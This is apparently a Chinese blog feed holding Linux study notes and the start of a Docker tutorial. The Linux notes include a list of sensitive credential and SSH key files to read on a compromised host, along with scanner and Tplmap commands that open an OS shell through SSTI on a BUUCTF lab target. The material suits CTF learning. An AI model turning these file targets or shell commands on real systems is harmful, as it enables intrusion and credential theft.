<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件系统        容量     已用  可用   已用%  挂载点</span><br><span class="line">udev            945M     0  945M    0%   /dev</span><br><span class="line">tmpfs           198M  1.4M  196M    1%   /run</span><br><span class="line">/dev/sda1       78G   12G   62G     16%  /</span><br><span class="line">tmpfs           987M  8.0K  987M    1%   /dev/shm</span><br><span class="line">tmpfs           5.0M     0  5.0M    0%   /run/lock</span><br><span class="line">tmpfs           198M   84K  198M    1%   /run/user/1000</span><br><span class="line">tmpfs           198M   68K  198M    1%   /run/user/130	</span><br></pre></td></tr></table></figure>

<p>​	<strong>挂载</strong>：将一个目录当成进入点，将磁盘分区的数据放置在该目录下，也就是说进入该目录就可以读取该分区的意思，这个动作我们称为<strong>挂载</strong>，那个进入点的目录我们称为<strong>挂载点</strong>(Linux中的磁盘文件系统的入口目录)</p>
<ul>
<li>&#x2F;dev：设备(device)的缩写，包含了所有Linux系统中使用的外部设备</li>
<li>&#x2F;run：存储一些运行过程中用户或进程有关的数据，内核级文件</li>
<li>&#x2F;dev&#x2F;shm：这个目录在内存里，通常为系统内存的一半；由于该目录是在内存中，所以在系统中需要使用的临时数据可将其存储在该目录中，相当于我们直接在内存读写文件，但重启后原来的文件将不存在</li>
<li>&#x2F;：根目录</li>
</ul>
<p><strong>根目录说明</strong></p>
<table>
<thead>
<tr>
<th align="left">路径</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">.&#x2F;</td>
<td>当前目录</td>
</tr>
<tr>
<td align="left">..&#x2F;</td>
<td>表示上一级目录</td>
</tr>
<tr>
<td align="left">&#x2F;bin</td>
<td>存放 Linux 常用的命令</td>
</tr>
<tr>
<td align="left">&#x2F;usr&#x2F;sbin</td>
<td>存放管理员的系统管理程序</td>
</tr>
<tr>
<td align="left">&#x2F;etc</td>
<td>存放系统管理时用到的用到的 配置文件 和 子目录</td>
</tr>
<tr>
<td align="left">&#x2F;lib</td>
<td>存放系统动态链接共享库，通常后缀名为 .so，类似于 .dll（windows）</td>
</tr>
<tr>
<td align="left">&#x2F;proc</td>
<td>存储系统内存中的信息</td>
</tr>
<tr>
<td align="left">&#x2F;opt</td>
<td>optional，可选目录，交由用户使用，默认为空</td>
</tr>
</tbody></table>
<p>​	通常我们可以使用 &#x2F;opt 和 &#x2F;home 目录，这两个目录均由用户处理，不存在敏感文件，也可将程序安装在 &#x2F;opt&#x2F; 目录下</p>
<h2 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h2><h3 id="内网存活主机ip文件"><a href="#内网存活主机ip文件" class="headerlink" title="内网存活主机ip文件"></a>内网存活主机ip文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/hosts</span><br><span class="line">/proc/net/arp</span><br><span class="line">/proc/net/tcp</span><br><span class="line">/proc/net/udp</span><br><span class="line">/proc/net/dev</span><br><span class="line">/proc/net/fib_trie</span><br></pre></td></tr></table></figure>

<h3 id="常见的敏感文件"><a href="#常见的敏感文件" class="headerlink" title="常见的敏感文件"></a>常见的敏感文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd					//存放所有用户信息</span><br><span class="line">/etc/shadow					//存放用户密码信息</span><br><span class="line"></span><br><span class="line">/root/.bash_history 		//root的bash历史记录</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.mysql_history 		//mysql的bash历史记录</span><br><span class="line">/root/.wget-hsts</span><br><span class="line"></span><br><span class="line">/proc/mounts</span><br><span class="line">/porc/config.gz</span><br><span class="line">/proc/sched_debug 	//提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用</span><br><span class="line">/proc/mounts 		//挂载的文件系统列表</span><br><span class="line">/proc/net/route 	//路由表信息</span><br><span class="line">/proc/version 		//内核版本</span><br><span class="line"></span><br><span class="line">/proc/[PID]/cmdline //可能包含有用的路径信息</span><br><span class="line">/proc/[PID]/environ //程序运行的环境变量信息，可以用来包含getshell</span><br><span class="line">/proc/[PID]/cwd 	//当前进程的工作目录</span><br><span class="line"></span><br><span class="line">//ssh的相关文件</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.pub</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/etc/ssh/sshd_config</span><br><span class="line">/var/log/secure</span><br><span class="line">/etc/sysconfig/network-scripts/ifcfg-eth0</span><br></pre></td></tr></table></figure>

<h3 id="部分nginx配置文件路径"><a href="#部分nginx配置文件路径" class="headerlink" title="部分nginx配置文件路径"></a>部分nginx配置文件路径</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/nginx/conf/nginx.conf		//配置文件</span><br><span class="line">/etc/nginx								//配置文件存放目录</span><br><span class="line">/etc/nginx/conf/nginx.conf				//主配置文件</span><br><span class="line">/usr/lib64/systemd/system/nginx.service	//管理脚本</span><br><span class="line">/usr/lisb64/nginx/modules				//模块</span><br><span class="line">/usr/sbin/nginx							//应用程序</span><br><span class="line">/usr/share/nginx/html					//程序默认存放位置</span><br><span class="line">/var/log/nginx							//日志默认存放位置</span><br></pre></td></tr></table></figure>

<h1 id="访问权限"><a href="#访问权限" class="headerlink" title="访问权限"></a>访问权限</h1><blockquote>
<p>Linux 下有两种用户，一种是 root用户(超级用户)：可以 <strong>不受限制地</strong> 做任何事情；另一种是普通用户</p>
</blockquote>
<ul>
<li>Linux 系统对文件权限有严格的控制，想要对 文件 执行某些操作，必须具有 相应的权限 才行</li>
<li>其权限类型有读(r)、写(w)、执行(x)，数字表示的话就是r&#x3D;4、w&#x3D;2、x&#x3D;1</li>
<li>Linux下 权限的 属组 有  <strong>所有者 、群组 、其它用户</strong>  三种。每个文件都可以针对这三个 属组（粒度），设置不同的 rwx 权限</li>
</ul>
<p>使用 <code>ls -l</code> 命令显示 文件 或 文件夹 的权限，可以看到文件类型和访问信息</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/001/001Linux-01.jpg" alt="001Linux-01"></p>
<p>文件类型：<strong>d</strong>(文件夹 目录文件)、**-** (普通文件)、<strong>l</strong> (软连接 相当于windows 中的快捷方式)……</p>
<p>访问信息以 <strong>3位为一组</strong> 分别组成 三个属组(所有者 、群组 、其它用户) 的权限，后面跟着的依次是 连接数(不太懂)、文件所有者、文件所属群组、文件大小、最新修改时间、文件名</p>
<ul>
<li>r：对文件而言，具有读取文件内容的权限；对目录来说，具有 浏览该目录信息 的权限</li>
<li>w：对文件而言，具有修改文件内容的权限；对目录来说，具有 删除、移动目录内文件 的权限</li>
<li>x：对文件而言，具有执行文件的权限；对目录来说，具有 进入目录 的权限</li>
</ul>
<h2 id="chmod-命令"><a href="#chmod-命令" class="headerlink" title="chmod 命令"></a>chmod 命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod [参数] 权限 文件</span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">参数为可选项，权限可以用数字来代替，一个 数字 代表一个 属组</span></span><br></pre></td></tr></table></figure>

<p>​	上面提到可以用数字来代替 rwx，比如 777 代表的是 <strong>所有用户</strong> 都有 读、写、执行 的权限，则代表只有 <strong>所有者</strong> 具有 读写权限(4+2)</p>
<h1 id="Linux-命令"><a href="#Linux-命令" class="headerlink" title="Linux 命令"></a>Linux 命令</h1><h2 id="vi-x2F-vim-语法"><a href="#vi-x2F-vim-语法" class="headerlink" title="vi&#x2F;vim 语法"></a>vi&#x2F;vim 语法</h2><table>
<thead>
<tr>
<th></th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>vi 文件名</td>
<td>打开 或 新建文件</td>
</tr>
<tr>
<td>k:↑   j:↓</td>
<td>h:←  l:→</td>
</tr>
<tr>
<td>i：插入光标左侧</td>
<td>a：插入光标右侧</td>
</tr>
<tr>
<td>o：新增下一行(光标的下一行)</td>
<td>O：新增上一行</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>&#x2F;violet</td>
<td>查找 violet，n查找下一个，N上一个</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>dd</td>
<td>删除当前行</td>
</tr>
<tr>
<td>yy</td>
<td>复制当前行</td>
</tr>
<tr>
<td>p</td>
<td>在当前光标后粘贴</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>:set nu 或:set number</td>
<td>显示行号</td>
</tr>
<tr>
<td>:n</td>
<td>跳转到第 n 行</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>u</td>
<td>撤销操作，相当于 Ctrl+z</td>
</tr>
<tr>
<td>:wq</td>
<td>保存并退出</td>
</tr>
<tr>
<td>:w</td>
<td>保存文件</td>
</tr>
<tr>
<td>:q!</td>
<td>强制退出并忽略所有更改(不保存就退出)</td>
</tr>
<tr>
<td>:e!</td>
<td>放弃所有更改，并打开原来的文件</td>
</tr>
</tbody></table>
<p>​	想要打开 vim的时候就看到行号，修改 vimrc 配置文件，输入 <code>vim --version</code> 可查看到 配置文件 的路径，用 vim 打开后输入 <code>set number</code> 和 <code>set relativenumber</code>（显示行号，显示相对行号）保存退出即可。跳转时用 <strong>j</strong> 表示 <strong>↓</strong>，<strong>k</strong> 表示 <strong>↑</strong>，5j 就是向下跳5行，5k 是向上跳5行</p>
<p>​	vim 是 vi 的延申，vim编辑源码会高亮，并且对 vi 完全兼容</p>
<h2 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h2><table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>ifconfig</td>
<td>查看所有网卡</td>
</tr>
<tr>
<td>ifconfig eth0</td>
<td>查看 eth0 网卡</td>
</tr>
<tr>
<td>ip addr</td>
<td>查看所有网卡(显示MAC地址 参数高亮显示)</td>
</tr>
</tbody></table>
<blockquote>
<p>ifconfig [网卡] 参数</p>
<p>down：关闭指定的网络设备，up：启动指定的网络设备</p>
</blockquote>
<p>配置静态ip：输入 <code>sudo vim /etc/network/interfaces</code>  按照如下内容修改即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto eth0  				#指定网卡</span><br><span class="line">iface eth0 inet static  #启动静态ip</span><br><span class="line">address 192.168.0.XXX  	#设置静态ip</span><br><span class="line">netmask 255.255.255.0  	#子网掩码</span><br><span class="line">gateway 192.168.0.1  	#指定网关</span><br></pre></td></tr></table></figure>

<p>​	保存退出后，输入 <code>systemctl restart networking</code> 重启网络即可（<code>sudo service networking restart</code>也可以）</p>
<h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><p><strong>&gt; | &lt;</strong> </p>
<table>
<thead>
<tr>
<th>符号</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>&gt;</td>
<td>符号左边的输出 作为 右边的输入(一般用于导出到文件，若文件存在时会覆盖内容 )</td>
</tr>
<tr>
<td>&gt;&gt;</td>
<td>同上，但它是在文件末尾追加内容</td>
</tr>
<tr>
<td>|</td>
<td>左侧命令的输出 作为 右侧的输入</td>
</tr>
<tr>
<td>&lt;</td>
<td>读取符号右边的内容 作为 左边的输出</td>
</tr>
</tbody></table>
<p>箭头的指向就是数据的流向</p>
<ul>
<li>标准输入：数字为0，使用 &lt; 或 &lt;&lt; </li>
<li>标准正常输出：数字为1，使用 &gt; 或 &gt;&gt; </li>
<li>标准错误输出：数字为2，使用 2&gt; 或 2&gt;&gt; ，命令执行期间的各种错误信息将发送到标准错误文件</li>
</ul>
<p><strong>重启、关机、登出</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>reboot</td>
<td>现在立刻重启</td>
</tr>
<tr>
<td>shutdown -r now</td>
<td>同上</td>
</tr>
<tr>
<td>shutdown -r 11:30</td>
<td>11:30后重启</td>
</tr>
<tr>
<td>poweroff</td>
<td>现在立刻关机</td>
</tr>
<tr>
<td>shutdown -h now</td>
<td>同上</td>
</tr>
<tr>
<td>logout</td>
<td>注销</td>
</tr>
</tbody></table>
<p><strong>系统管理</strong></p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>top</td>
<td>查看 CPU 和 内存 等的使用情况，类似于任务管理器</td>
</tr>
<tr>
<td>ps</td>
<td>查看进程</td>
</tr>
<tr>
<td>kill -9 PID号</td>
<td>杀死指定 PID号进程(也可以是该进程的名字)</td>
</tr>
<tr>
<td>history</td>
<td>查看历史命令</td>
</tr>
<tr>
<td>free -h</td>
<td>查看总容量、已用、可用、缓存大小(-h 友好显示)</td>
</tr>
</tbody></table>
<p><strong>文件、文件夹</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>cd &#x2F;home&#x2F;kali</td>
<td>进入&#x2F;home&#x2F;kali目录</td>
</tr>
<tr>
<td>cd ..</td>
<td>返回到上一级目录</td>
</tr>
<tr>
<td>pwd</td>
<td>查看当前路径</td>
</tr>
<tr>
<td>ls</td>
<td>显示当前目录所有 非隐藏 的文件（类似于windows 的 dir）</td>
</tr>
<tr>
<td>mkdir test</td>
<td>创建一个名为 test 的目录</td>
</tr>
<tr>
<td>cat test.txt</td>
<td>查看纯文本文件内容</td>
</tr>
<tr>
<td>cp -r test1 test2</td>
<td>复制 文件 或 文件夹(-r：复制该目录下所有的子目录和文件)</td>
</tr>
<tr>
<td>mv 旧路径 新路径</td>
<td>移动文件</td>
</tr>
<tr>
<td>rm -f 文件名</td>
<td>强制删除文件，-r为递归删除目录及其文件</td>
</tr>
<tr>
<td>find 目录 -name “filename”</td>
<td>在指定目录下查看 名为 filename 的文件或目录</td>
</tr>
</tbody></table>
<p><strong>ls</strong> 命令参数</p>
<ul>
<li>-l：显示 文件 和 目录的详细资料</li>
<li>-a：显示隐藏文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">蓝色文件:目录</span><br><span class="line">白色文件:一般文件，如文本文件，配置文件，源码文件等</span><br><span class="line">浅蓝色文件:链接文件，主要是使用ln命令建立的文件</span><br><span class="line">绿色文件:可执行文件，可执行的程序</span><br><span class="line">红色文件:压缩文件 或者 包文件</span><br></pre></td></tr></table></figure>

<p><strong>gerp str filename</strong>：在名为 filename 的文件中查找 str 字符串</p>
<ul>
<li><code>grep -r str /home/kali </code> ：对文本进行递归搜索</li>
<li><code>grep -wf file1 file2</code> ：比较两个文件并输出相同部分的内容</li>
<li>-n：输出包含查找字符串的 行数</li>
</ul>
<p><strong>其他</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>curl <a href="https://www.baidu.com/">https://www.baidu.com</a></td>
<td>在命令行终端下使用的网络请求工具</td>
</tr>
<tr>
<td>wegt <a href="http://www.baidu.com/">www.baidu.com</a></td>
<td>下载网页到当前目录</td>
</tr>
<tr>
<td>traceroute <a href="http://www.baidu.com/">www.baidu.com</a></td>
<td>路由跟踪(Windows中是 tracert)</td>
</tr>
<tr>
<td>whois baidu.com</td>
<td>查询域名注册信息</td>
</tr>
</tbody></table>
<ul>
<li>traceroute：检测 主机 到达 目标点 中间有多少个网关，原理是 以最小的TTL（存活时间）发出探测包来跟踪 数据包 到达 目标主机 所经过的网关，然后监听一个来自 网关ICMP 的应答</li>
<li>whois：一般的注册信息会包括 域名所有者、服务商、管理员邮件地址、域名注册时间和 过期时间</li>
</ul>
<h1 id="扫描工具-命令"><a href="#扫描工具-命令" class="headerlink" title="扫描工具(命令)"></a>扫描工具(命令)</h1><h2 id="arp-scan"><a href="#arp-scan" class="headerlink" title="arp-scan"></a>arp-scan</h2><p>​	扫描主机并自动解析MAC地址，得到对应硬件厂商。扫描时可以进行单一目标扫描，也可以进行批量扫描(需要在后面跟上一个网段，或者将想要扫描的主机写入文件中)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-l：扫描这个网段的所有主机(若有多个网卡可用 --interface=eth0 选择网卡)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/001/001Linux-02.jpg"></p>
<h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p>​	用于暴力扫描页面结构，包括网页中的目录和文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirsearch -u url -e * --timeout=2 -t 1 -x 400,403,404,500,503,429</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-u URL			指定目标URL</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-e EXTENSIONS		包含的文件扩展名,逗号隔开(例如：php,asp)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-i				保留的响应状态码(以逗号分隔,支持指定范围),如(-i 200,300-399)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-x				排除的响应状态码(以逗号分隔,支持指定范围),如(-x 301,500-599)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-t				线程数</span></span><br></pre></td></tr></table></figure>

<h2 id="Arjun"><a href="#Arjun" class="headerlink" title="Arjun"></a>Arjun</h2><p>​	一款 HTTP 参数扫描器，主要是爆破 URL 参数的<del>（以前做SSTI的题根本不知道参数是哪来的，今天终于知道了！！）</del></p>
<ul>
<li>支持 GET&#x2F;POST&#x2F;POST-JSON&#x2F;POST-XML 请求</li>
<li>自动处理速率限制和超时</li>
<li>可以将结果导出到：BurpSuite、文本或 JSON 文件</li>
<li>从以下位置导入目标：BurpSuite、文本文件或原始请求文件</li>
<li>可以被动地从 JS 或 3 个外部源中提取参数</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arjun -u http://c8d1a341-07e6-4e81-9cda-16163fc5f059.node4.buuoj.cn:81/ -c 100 -d 0.5</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-c</td>
<td>可指定一次发送的参数数量，默认情况下，Arjun 在请求中包含 500 个参数</td>
</tr>
<tr>
<td>-u</td>
<td>扫描单个URL</td>
</tr>
<tr>
<td>-m</td>
<td>指定 HTTP 方法，默认为GET(可用：GET&#x2F;POST&#x2F;JSON&#x2F;XML)</td>
</tr>
<tr>
<td>-t</td>
<td>Arjun 默认使用 2 个线程，但可以根据网络连接和目标限额调整其性能</td>
</tr>
<tr>
<td>-d</td>
<td>该参数可以延迟请求，但会将线程数设为 1</td>
</tr>
</tbody></table>
<p>参考：<a href="https://www.ddosi.org/arjun/#%E4%BB%80%E4%B9%88%E6%98%AFArjun">Arjun HTTP参数发现</a></p>
<h2 id="Tplmap"><a href="#Tplmap" class="headerlink" title="Tplmap"></a>Tplmap</h2><ul>
<li>可以通过使用沙箱转义技术找到 代码注入 和 服务器端模板注入（SSTI）漏洞</li>
<li>能够在许多模板引擎中利用SSTI来访问 目标文件 或操作系统，可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力</li>
<li>支持的模板引擎有：PHP、Ruby、JaveScript、Python、ERB、Jinja2和Tornado</li>
</ul>
<h3 id="报错处理"><a href="#报错处理" class="headerlink" title="报错处理"></a>报错处理</h3><p>如果像下面一样报错，可参考<a href="https://github.com/epinna/tplmap/issues/104">module ‘collections’ has no attribute ‘Mapping’ · Issue</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tplmap module &#x27;collections&#x27; has no attribute &#x27;Mapping&#x27;</span><br></pre></td></tr></table></figure>

<p>​	大概意思：报错来自于 <code>core/plugin.py</code>，从 python3.3开始，<strong>import collections</strong> 这种导入方式已被弃用，所以我们要改为 <strong>from collections.abc import Mapping</strong>，还要将 21、22行的 **collections.Mapping **改为 <strong>Mapping</strong></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>例题：BUUCTF-[Flask]SSTI</p>
<p>在 tplmap文件夹下打开终端输入以下命令，-u是指定url</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python tplmap.py -u http://node4.buuoj.cn:29377/?name=&#123;&#123;1&#125;&#125; </span><br></pre></td></tr></table></figure>

<p>下面是一部分回显信息，可以看到这是 Jinja2模板，下面还提示我们可以使用 –os-shell 拿到shell</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/001/001Linux-05.jpg" alt="001Linux-05"></p>
<p>加上 –os-shell 后重新运行 tplmap.py</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python tplmap.py -u http://node4.buuoj.cn:29377/?name=&#123;&#123;1&#125;&#125; --os-shell</span><br></pre></td></tr></table></figure>

<p><del>可恶，看来WP才知道flag是在环境变量中，当时手工注的时候一直没找到</del></p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/001/001Linux-06.jpg" alt="001Linux-06"></p>
<p>一些参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--os-shell          # 获取Shell</span><br><span class="line">--os-cmd=CMD		# 执行操作系统命令</span><br><span class="line">--upload=file       # 上传本地文件到远程主机</span><br></pre></td></tr></table></figure>

<p><del>工具好用是好用，但平时还是手工注入吧</del></p>
]]></content>
      <categories>
        <category>锻体</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker-基本学习</title>
    <url>/2023/01/30/003%E2%80%94Docker/</url>
    <content><![CDATA[<p>​	学习了B站狂神老师的docker入门课程，下面是我的学习笔记，老师讲的很好！(当时还担心学生认证时领的ECS会没有用武之地呢，以下的所有测试都是在其上面进行的)</p>
<p>视频链接：<a href="https://www.bilibili.com/video/BV1og4y1q7M4/">【狂神说Java】Docker最新超详细版教程通俗易懂</a></p>
<h1 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h1><p>​	一个开源的应用容器引擎，让开发者可以打包他们的 应用 和 依赖包 到一个可移植的镜像中，然后发布到操作系统的机器上，也可以实现虚拟化。容器之间使用隔离机制，相互不会有任何干扰</p>
<p>​	是内核级别的虚拟化，可以在一个物理机上运行很多容器实例</p>
<p>理念：将 应用 和 运行的环境 打包为一个镜像，发布之后启动运行就变成了一个容器</p>
<p><strong>比较与 虚拟机技术 的不同</strong></p>
<ul>
<li><p>虚拟机：虚拟出一套硬件，运行一个完整的操作系统，然后在操作系统上 安装 和 运行 软件</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-01.jpg" alt="docker-01"></p>
</li>
<li><p>而容器内的 应用 是直接运行在 宿主机 的内核，容器没有自己的内核(利用 宿主机 的内核)，也没有虚拟硬件，很轻便（宿主机：当前应用运行在哪，哪就是宿主机）</p>
<p>​	每个容器间相互隔离，各自都有一个属于自己的文件系统，互不影响</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-02.jpg" alt="docker-02"></p>
</li>
</ul>
<h2 id="名词概念"><a href="#名词概念" class="headerlink" title="名词概念"></a>名词概念</h2><ul>
<li><p><strong>镜像</strong>：好比是一个模板，通过这个模板可以用来创建 容器服务，通过 run 命令来运行。一个镜像可以创建多个容器（最终的 服务 或是 项目 是运行在容器中的）</p>
</li>
<li><p><strong>容器</strong>：Docker利用容器技术可以独立运行一个或者一组应用，是通过 镜像 创建的</p>
</li>
<li><p><strong>仓库</strong>：存放镜像的地方，分为公有仓库（Docker hub、腾讯云、阿里云等等）和私有仓库（公有仓库是国外的话需要配置镜像加速）</p>
</li>
</ul>
<h2 id="Run的流程"><a href="#Run的流程" class="headerlink" title="Run的流程"></a>Run的流程</h2><blockquote>
<p>docker run 镜像名称</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@root ~]# docker run hello-world</span><br><span class="line">Unable to find image &#x27;hello-world:latest&#x27; locally	# 试图寻找镜像但是并没有在本地找到</span><br><span class="line">latest: Pulling from library/hello-world			# 使用pull远程拉取镜像</span><br><span class="line">2db29710123e: Pull complete 						# 返回签名信息证明成功拉取到</span><br><span class="line">Digest: sha256:2498fce14358aa50ead0cc6c19990fc6ff866ce72aeb5546e1d59caac3d0d60f</span><br><span class="line">Status: Downloaded newer image for hello-world:latest</span><br><span class="line"></span><br><span class="line">Hello from Docker!									# hello-world镜像安装成功</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line"> 1. The Docker client contacted the Docker daemon.</span><br><span class="line"> 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.(amd64)</span><br><span class="line"> 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading.</span><br><span class="line"> 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal.</span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class="line"><span class="meta prompt_"> $ </span><span class="language-bash">docker run -it ubuntu bash</span></span><br><span class="line"></span><br><span class="line">Share images, automate workflows, and more with a free Docker ID:</span><br><span class="line"> https://hub.docker.com/</span><br><span class="line"></span><br><span class="line">For more examples and ideas, visit:</span><br><span class="line"> https://docs.docker.com/get-started/</span><br></pre></td></tr></table></figure>

<p>​	Docker会先在本机寻找是否有这个镜像，有则运行；没有的话就去Dokcer hub寻找，如果找不到则会提示找不到；找的的话则会下载镜像到本地，然后运行这个镜像，如下图所示</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-03.jpg" alt="docker-03"></p>
<h2 id="底层原理-如何工作？"><a href="#底层原理-如何工作？" class="headerlink" title="底层原理(如何工作？)"></a>底层原理(如何工作？)</h2><p>​	Docker是一个C&#x2F;S架构的系统，它的守护进程(服务)一直运行在 服务端主机的后台，客户端可通过 Socket 与 服务端 通信。服务端 接收到 客户端 的命令后，就会执行这个命令</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-04.jpg" alt="docker-04"></p>
<h1 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h1><p><strong>帮助命令</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>docker version</td>
<td>显示 docker 的版本信息</td>
</tr>
<tr>
<td>docker info</td>
<td>显示 docker 的系统信息，包括镜像和容器的数量</td>
</tr>
<tr>
<td>docker 命令 –help</td>
<td>帮助命令</td>
</tr>
</tbody></table>
<p>官方文档位置：<a href="https://docs.docker.com/reference/">Reference documentation</a>，从 Reference 中可以查看全部命令解析</p>
<h2 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h2><h3 id="docker-images"><a href="#docker-images" class="headerlink" title="docker images"></a>docker images</h3><p>查看本地主机上的镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">参数说明</span></span><br><span class="line">-a, --all             # 列出所有的镜像</span><br><span class="line">-q, --quiet           # 只显示镜像的ID</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">命令执行</span></span><br><span class="line">[root@root ~]# docker images</span><br><span class="line">REPOSITORY          TAG            IMAGE ID            CREATED             SIZE</span><br><span class="line">hello-world         latest         feb5d9fea6a5        16 months ago       13.3kB</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">REPOSITORY:镜像的仓库源(名字)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">TAG:镜像的版本标签信息</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">IMAGE ID:镜像ID</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CREATED:镜像创建时间</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SIZE:镜像大小</span></span><br></pre></td></tr></table></figure>

<h3 id="docker-search"><a href="#docker-search" class="headerlink" title="docker search"></a>docker search</h3><p>搜索镜像</p>
<p>官方的镜像商店：<a href="https://hub.docker.com/">Docker Hub</a>，所有的镜像可以在上面找，与用命令来寻找是一样的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@root ~]# docker search mysql</span><br><span class="line">NAME                            DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED</span><br><span class="line">mysql                           MySQL is a widely used, open-source relation…   13767               [OK]                </span><br><span class="line">mariadb                         MariaDB Server is a high performing open sou…   5253                [OK]                </span><br><span class="line">phpmyadmin                      phpMyAdmin - A web interface for MySQL and M…   731                 [OK]                </span><br><span class="line">percona                         Percona Server is a fork of the MySQL relati…   599                 [OK]                </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回的结果太多了,就不一一展示了</span></span><br></pre></td></tr></table></figure>

<p>举个例子，搜索 Tomcat 镜像</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/003/docker-04.png" alt="docker-04"></p>
<h3 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h3><p>下载镜像</p>
